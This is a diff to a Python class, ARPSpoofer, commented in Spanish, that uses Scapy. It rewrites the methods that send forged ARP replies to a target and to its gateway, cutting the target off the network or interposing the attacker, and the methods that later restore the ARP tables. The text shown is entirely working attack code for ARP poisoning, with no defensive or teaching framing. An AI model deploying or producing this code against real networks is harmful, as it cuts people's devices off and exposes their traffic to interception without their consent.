@@ -282,107 +282,104 @@ class ARPSpoofer:
             time.sleep(0.02)  # Pequeña pausa para no saturar
     
     def _spoof_target(self, target_ip: str, target_mac: str):
-        """Método interno que se ejecuta en un hilo para el spoofing de un objetivo"""
+        """Método interno que se ejecuta en un hilo para el spoofing de un objetivo, adaptado del script"""
         target_info = self.targets.get(target_ip)
         if not target_info:
             return
         
         try:
-            self._report_status(target_ip, "Iniciando restricción de acceso")
-            
-            # Realizar flooding inicial para establecer el bloqueo rápidamente
-            self._flood_target(target_ip, target_mac)
-            
-            # Crear paquetes ARP para el spoofing continuo
-            # 1. Decirle al objetivo que somos la puerta de enlace
-            target_packet = ARP(
-                op=2,  # ARP Reply
-                pdst=target_ip,
-                hwdst=target_mac,
-                psrc=self.gateway_ip,
-                hwsrc=self.local_mac
+            self._report_status(target_ip, f"Iniciando restricción de acceso para {target_ip} (MAC: {target_mac})")
+
+            # 1. Paquete ARP para el objetivo: Decirle que la IP de la puerta de enlace tiene nuestra MAC
+            respuesta_arp_objetivo = ARP(
+                pdst=target_ip,            # IP Destino: Objetivo
+                hwdst=target_mac,          # MAC Destino: Objetivo
+                psrc=self.gateway_ip,      # IP Origen: Puerta de enlace (engañosa)
+                hwsrc=self.local_mac,      # MAC Origen: Nuestra MAC
+                op=2                       # op=2 (ARP Reply)
             )
-            
-            # 2. Decirle a la puerta de enlace que somos el objetivo
-            # Usamos broadcast para mayor efectividad, como en PinguExit
-            gateway_packet = ARP(
-                op=2,  # ARP Reply
-                pdst=self.gateway_ip,
-                hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast
-                psrc=target_ip,
-                hwsrc=self.local_mac
+
+            # 2. Paquete ARP para la puerta de enlace: Decirle que la IP del objetivo tiene nuestra MAC
+            # Usar MAC de broadcast para la puerta de enlace para mayor fiabilidad
+            respuesta_arp_puerta = ARP(
+                pdst=self.gateway_ip,      # IP Destino: Puerta de enlace
+                hwdst="ff:ff:ff:ff:ff:ff", # MAC Destino: Broadcast (o self.gateway_mac si se prefiere)
+                psrc=target_ip,            # IP Origen: Objetivo (engañosa)
+                hwsrc=self.local_mac,      # MAC Origen: Nuestra MAC
+                op=2                       # op=2 (ARP Reply)
             )
-            
-            # Iniciar conteo para reportes periódicos
+
             start_time = time.time()
             packet_count = 0
-            
-            # Enviar paquetes mientras el spoofing esté activo
+
             while self.targets.get(target_ip, {}).get('running', False):
                 try:
-                    # Enviar paquetes - intentamos múltiples veces para garantizar entrega
-                    send(target_packet, verbose=0, count=2)
-                    send(gateway_packet, verbose=0, count=2)
-                    
+                    send(respuesta_arp_objetivo, verbose=0)
+                    send(respuesta_arp_puerta, verbose=0)
                     packet_count += 2
-                    
-                    # Cada 30 segundos reportamos estadísticas
+
+                    # Log periódico (opcional, adaptado de la lógica original)
                     elapsed = time.time() - start_time
                     if elapsed > 30:
                         self._report_status(
-                            target_ip, 
-                            f"Spoofing activo. {packet_count} paquetes enviados en {int(elapsed)} segundos"
+                            target_ip,
+                            f"ARP Spoofing activo. {packet_count} paquetes enviados en {int(elapsed)} segundos."
                         )
                         start_time = time.time()
                         packet_count = 0
-                    
-                    time.sleep(self.packet_rate)  # Intervalo entre envíos
-                    
+
+                    time.sleep(self.packet_rate)
+
                 except Exception as e:
-                    self._report_status(target_ip, f"Error durante el spoofing: {e}", False)
-                    # Esperamos un poco más en caso de error antes de reintentar
-                    time.sleep(1)
-            
-            # Restaurar la conexión si se detuvo el spoofing
+                    self._report_status(target_ip, f"Error durante el envío de paquetes ARP: {e}", False)
+                    time.sleep(1) # Esperar antes de reintentar
+
+            # Al salir del bucle (cuando 'running' es False), restaurar conexión
             self._restore_connection(target_ip, target_mac)
-            
+
         except Exception as e:
-            self._report_status(target_ip, f"Error fatal en el spoofing: {e}", False)
+            self._report_status(target_ip, f"Error fatal en el hilo de spoofing: {e}", False)
+            # Intentar restaurar incluso si hay un error fatal
             self._restore_connection(target_ip, target_mac)
     
     def _restore_connection(self, target_ip: str, target_mac: str):
-        """Restaura la conexión normal enviando paquetes ARP correctos"""
+        """Restaura la conexión normal enviando paquetes ARP correctos, adaptado del script"""
+        if not self.gateway_mac or not target_mac:
+             self._report_status(target_ip, "No se puede restaurar: falta MAC de gateway o objetivo.", False)
+             return
+
         try:
             self._report_status(target_ip, "Restaurando conexión ARP...")
-            
-            # Corregir la tabla ARP del objetivo
-            target_restore = ARP(
-                op=2,
-                pdst=target_ip,
-                hwdst=target_mac,
-                psrc=self.gateway_ip,
-                hwsrc=self.gateway_mac
+
+            # Paquete para restaurar la tabla ARP del objetivo
+            respuesta_arp_objetivo_restore = ARP(
+                pdst=target_ip,            # IP Destino: Objetivo
+                hwdst=target_mac,          # MAC Destino: Objetivo
+                psrc=self.gateway_ip,      # IP Origen: Puerta de enlace (Correcta)
+                hwsrc=self.gateway_mac,    # MAC Origen: Puerta de enlace (Correcta)
+                op=2                       # op=2 (ARP Reply)
             )
-            
-            # Corregir la tabla ARP de la puerta de enlace
-            gateway_restore = ARP(
-                op=2,
-                pdst=self.gateway_ip,
-                hwdst=self.gateway_mac,
-                psrc=target_ip,
-                hwsrc=target_mac
+
+            # Paquete para restaurar la tabla ARP de la puerta de enlace
+            respuesta_arp_puerta_restore = ARP(
+                pdst=self.gateway_ip,      # IP Destino: Puerta de enlace
+                hwdst=self.gateway_mac,    # MAC Destino: Puerta de enlace (Correcta)
+                psrc=target_ip,            # IP Origen: Objetivo (Correcta)
+                hwsrc=target_mac,          # MAC Origen: Objetivo (Correcta)
+                op=2                       # op=2 (ARP Reply)
             )
-            
-            # Enviar varias veces para asegurar que se restaure la conexión
-            for _ in range(7):  # Aumentado para mayor fiabilidad
-                send(target_restore, verbose=0, count=2)
-                send(gateway_restore, verbose=0, count=2)
-                time.sleep(0.1)
-            
-            self._report_status(target_ip, "Conexión restaurada correctamente")
-            
+
+            # Enviar los paquetes de restauración varias veces para asegurar
+            self._report_status(target_ip, "Enviando paquetes ARP de restauración...")
+            for _ in range(5): # Enviar 5 veces como en el script
+                send(respuesta_arp_objetivo_restore, count=1, verbose=0) # count=1 ya que está en loop
+                send(respuesta_arp_puerta_restore, count=1, verbose=0)
+                time.sleep(0.2) # Pequeña pausa entre envíos
+
+            self._report_status(target_ip, "Paquetes de restauración enviados.")
+
         except Exception as e:
-            self._report_status(target_ip, f"Error al restaurar la conexión: {e}", False)
+            self._report_status(target_ip, f"Error al enviar paquetes de restauración: {e}", False)
     
     def _verify_blocking(self, target_ip: str):
         """Verifica que el bloqueo está funcionando para el IP objetivo"""
